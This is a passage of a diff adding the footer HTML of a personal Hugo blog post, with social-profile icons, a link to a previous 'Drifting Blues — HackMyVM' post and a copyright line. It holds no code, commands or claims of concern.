+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="https://k40tik.github.io/posts/drifting-blues-hackmyvm/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Drifting Blues — HackMyVM</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-09-07 10:00:00 &#43;0300 EAT">7 September 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
